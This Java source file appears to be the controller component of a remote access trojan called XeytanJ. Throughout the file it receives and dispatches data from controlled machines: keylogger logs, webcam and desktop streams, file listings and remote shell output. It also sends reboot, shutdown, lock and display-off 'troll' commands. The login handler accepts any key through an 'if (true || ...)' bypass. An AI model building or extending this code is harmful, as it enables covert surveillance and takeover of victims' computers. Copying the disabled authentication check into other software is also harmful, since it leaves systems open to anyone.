package com.melardev.xeytanj.services.net.transport.p2p;

import com.melardev.xeytanj.enums.MediaInstruction;
import com.melardev.xeytanj.enums.MediaState;
import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.ProcessInfoDetails;
import com.melardev.xeytanj.marshallers.SerializationMarshaller;
import com.melardev.xeytanj.models.FileInfoStructure;
import com.melardev.xeytanj.models.MediaConfigState;
import com.melardev.xeytanj.models.ProcessStructure;
import com.melardev.xeytanj.net.packets.*;
import com.melardev.xeytanj.net.packets.filesystem.PacketFileExplorer;
import com.melardev.xeytanj.net.packets.multimedia.*;
import com.melardev.xeytanj.net.packets.process.PacketProcess;
import com.melardev.xeytanj.net.packets.process.PacketProcessList;
import com.melardev.xeytanj.services.config.IConfigService;
import com.melardev.xeytanj.services.logger.ILogger;
import com.melardev.xeytanj.services.net.ClientController;
import com.melardev.xeytanj.services.net.INetworkClientService;

import javax.swing.*;
import java.util.List;

import static com.melardev.xeytanj.net.packets.PacketType.*;

public abstract class AbstractClientService implements INetworkClientService {

    protected ClientController clientController;
    protected boolean loggedIn;
    protected MediaState desktopMediaState;
    protected ILogger logger;
    protected MediaState cameraMediaState;
    protected IConfigService config;
    private final SerializationMarshaller serializer;

    public AbstractClientService() {
        serializer = new SerializationMarshaller();
    }

    protected abstract void sendPacket(Packet packet);

    public void onDataReceived(byte[] payload) {
        Packet packet = serializer.read(payload);
        dispatchPacket(packet);
    }

    protected void dispatchPacket(Packet packet) {
        if (!loggedIn && packet.getType() != PacketType.LOGIN) {
            return;
        }
        switch (packet.getType()) {
            case LOGIN:
                handleLogin((PacketLogin) packet);
                break;
            case PRESENTATION:
                clientController.onPresentationData((PacketPresentation) packet);
                break;
            case DESKTOP_CONFIG:
            case DESKTOP: {
                if (clientController.shouldHandlePacket(packet.getType())) {

                    if (packet.getClass() == PacketDesktopConfigResponse.class) {
                        clientController.onDesktopConfigInfoReceived(
                                ((PacketDesktopConfigResponse) packet).getScreenDeviceInfoList());
                    } else if (packet.getClass() == PacketMediaResponse.class) {
                        ImageIcon image = ((PacketMediaResponse) packet).getImage();
                        clientController.onDesktopImageReceived(image);
                    }
                    break;
                }
            }
            case CAMERA_CONFIG:
            case CAMERA: {
                if (clientController.shouldHandlePacket(packet.getType())) {
                    if (packet.getClass() == PacketMediaResponse.class) {
                        PacketMediaResponse packetCamera = (PacketMediaResponse) packet;
                        clientController.onCameraPacketReceived(packetCamera.getImage());

                    } else if (packet.getClass() == PacketCameraConfigResponse.class) {
                        PacketCameraConfigResponse packetCamera = (PacketCameraConfigResponse) packet;
                        clientController.onCameraConfigInfoReceived(packetCamera.getScreenDeviceInfoList());
                    }
                }
                break;
            }
            case FILE_EXPLORER: {
                if (clientController.shouldHandlePacket(FILE_EXPLORER)) {
                    PacketFileExplorer packetFileExplorer = (PacketFileExplorer) packet;
                    switch (packetFileExplorer.getAction()) {
                        case LIST_ROOTS:
                            clientController.onFilesystemRootInfoReceived(packetFileExplorer.getFileInfoStructures());
                            break;
                        case LIST_FILES:
                            clientController.onFileSystemInfoUpdate(packetFileExplorer.getFileInfoStructures());
                            break;
                        default:
                            break;
                    }
                }
                break;
            }
            case FILE: {
                if (clientController.shouldHandlePacket(FILE)) {

                    break;
                }
            }
            case SHELL: {
                clientController.onClientShellInfoReceived(((PacketShell) packet).getResult());
                break;
            }
            case VOICE: {
                break;
            }

            case KEYLOGGER: {
                clientController.onKeylogDataReceived(((PacketKeylog) packet).getLogs());
                break;
            }
            case CHAT: {
                if (clientController.shouldHandlePacket(CHAT)) {
                    clientController.onChatMessageReceived(((PacketChat) packet).getMessage());
                }
                break;
            }
            case TROLL: {
                break;
            }
            case PROCESS: {
                if (clientController.shouldHandlePacket(PROCESS)) {
                    if (packet.getClass() == PacketProcessList.class) {
                        List<ProcessStructure> info = ((PacketProcessList) packet).getProcessStructures();
                        clientController.onProcessInfoReceived(info);
                    }
                }
                break;
            }
            default:
                break;
        }
    }

    private void handleLogin(PacketLogin packet) {
        logger.traceCurrentMethodName();
        if (packet.getLoginType() != PacketLogin.LoginType.LOGIN_REQUEST)
            return;

        if (true || config.getListeningKey().equals(packet.getKey())) {
            loggedIn = true;
            sendPacket(new PacketLogin(config.getListeningKey(), PacketLogin.LoginType.LOGIN_RESPONSE));
            clientController.onClientLoggedIn(packet, getRemoteIp());
        } else {
        }
    }


    @Override
    public void startRdpSession() {
        logger.traceCurrentMethodName();

        PacketDesktopRequest packet = new PacketDesktopRequest(DESKTOP_CONFIG);
        desktopMediaState = MediaState.WAITING_DEVICE_SELECTION;
        sendPacket(packet);
    }

    @Override
    public boolean isStreamingDesktop() {
        return false;
    }

    @Override
    public void pauseRemoteDesktop() {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.PAUSED;
        sendPacket(new PacketDesktopRequest(MediaInstruction.PAUSE));
    }

    @Override
    public void playRemoteDesktop(MediaConfigState configState) {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.STREAMING;
        PacketDesktopRequest packetPlay = new PacketDesktopRequest(DESKTOP, MediaInstruction.PLAY,
                configState);
        sendPacket(packetPlay);
    }

    @Override
    public void stopRemoteDesktop() {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.STOPPED;
        sendPacket(new PacketDesktopRequest(DESKTOP, MediaInstruction.STOP));
    }

    @Override
    public MediaState getDesktopMediaState() {
        return desktopMediaState;
    }

    @Override
    public void setConfig(IConfigService config) {
        this.config = config;
    }

    @Override
    public void startFileManagerSession() {
        logger.traceCurrentMethodName();
        PacketFileExplorer packet = new PacketFileExplorer();
        sendPacket(packet);
    }

    @Override
    public void onProcessSessionClosed() {

    }

    @Override
    public void startCameraSession(NetworkProtocol protocol) {
        cameraMediaState = MediaState.WAITING_DEVICE_SELECTION;
        logger.traceCurrentMethodName();
        PacketCameraRequest packet = new PacketCameraRequest(CAMERA_CONFIG);
        sendPacket(packet);
    }

    @Override
    public void playRemoteCamera(MediaConfigState configState) {
        logger.traceCurrentMethodName();
        cameraMediaState = MediaState.STREAMING;
        PacketCameraRequest packet = new PacketCameraRequest(MediaInstruction.PLAY);
        packet.setMediaConfigState(configState);

        packet.setRecordAudio(false);
        sendPacket(packet);
    }

    @Override
    public void stopCameraSession() {
        logger.traceCurrentMethodName();
        cameraMediaState = MediaState.STOPPED;
        sendPacket(new PacketCameraRequest(MediaInstruction.STOP));
    }

    @Override
    public MediaState getCameraMediaState() {
        return cameraMediaState;
    }

    @Override
    public boolean isStreamingCamera() {
        return false;
    }

    @Override
    public void pauseStreamingCamera() {
        logger.traceCurrentMethodName();
        cameraMediaState = MediaState.PAUSED;
        sendPacket(new PacketCameraRequest(MediaInstruction.PAUSE));
    }

    @Override
    public void onFilesystemRootInfoReceived(FileInfoStructure[] fileInfoStructures) {

    }

    @Override
    public void getFileSystemView(String fileSystemPath) {
        logger.traceCurrentMethodName();
        PacketFileExplorer packet = new PacketFileExplorer(fileSystemPath);
        sendPacket(packet);
    }

    @Override
    public void onFileSystemInfoUpdate(FileInfoStructure[] fileInfoStructures) {

    }

    @Override
    public void onKeylogDataReceived(String logs) {

    }

    @Override
    public void onKeylogSessionClosed() {

    }

    @Override
    public void startListProcess(ProcessInfoDetails level) {
        logger.traceCurrentMethodName();
        PacketProcess packet = new PacketProcessList();
        sendPacket(packet);
    }

    @Override
    public void killProcess(int pid) {

    }

    @Override
    public boolean isListProcessActive() {
        return false;
    }

    @Override
    public void stopProcessMonitor() {
        logger.traceCurrentMethodName();
    }

    @Override
    public void startShellSessionService() {
        logger.traceCurrentMethodName();
        PacketShell packet = new PacketShell(PacketShell.PacketShellInstruction.START);
        sendPacket(packet);
    }

    @Override
    public void sendShellCommand(String command) {
        logger.traceCurrentMethodName();
        sendPacket(new PacketShell(PacketShell.PacketShellInstruction.EXEC, command));
    }

    @Override
    public void pauseCameraStreaming() {
        logger.traceCurrentMethodName();
        desktopMediaState = MediaState.PAUSED;
        sendPacket(new PacketCameraRequest(MediaInstruction.PAUSE));
    }


    @Override
    public void startChatSession() {
        logger.traceCurrentMethodName();
        PacketChat packet = new PacketChat(PacketChat.ChatInstruction.START);
        sendPacket(packet);
    }

    @Override
    public void sendChatMessage(String text) {
        logger.traceCurrentMethodName();
        sendPacket(new PacketChat(text));
    }

    @Override
    public void onChatMessageReceived(String message) {
        logger.traceCurrentMethodName();
        clientController.onChatMessageReceived(message);
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    @Override
    public void stopShellSession() {
        sendPacket(new PacketShell(PacketShell.PacketShellInstruction.STOP));
    }

    @Override
    public void getSystemInfo() {
        sendPacket(new PacketPresentation());
    }


    public void startRebootSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.REBOOT);
    }

    public void startShutDownSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.SHUTDOWN);
    }

    public void startLogOffSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.LOG_OFF);
    }

    public void startLockSystem() {
        logger.traceCurrentMethodName();
        requestForTroll(PacketTroll.Command.LOCK);
    }

    public void startTurnDisplay(boolean on) {
        logger.traceCurrentMethodName();
        if (on)
            requestForTroll(PacketTroll.Command.TURN_ON_DISPLAY);
        else
            requestForTroll(PacketTroll.Command.TURN_OFF_DISPLAY);
    }

    public void requestForTroll(PacketTroll.Command command) {
        logger.traceCurrentMethodName();
        PacketTroll packet = new PacketTroll(command);
        sendPacket(packet);
    }

    @Override
    public void setClientController(ClientController clientController) {
        this.clientController = clientController;
    }
}
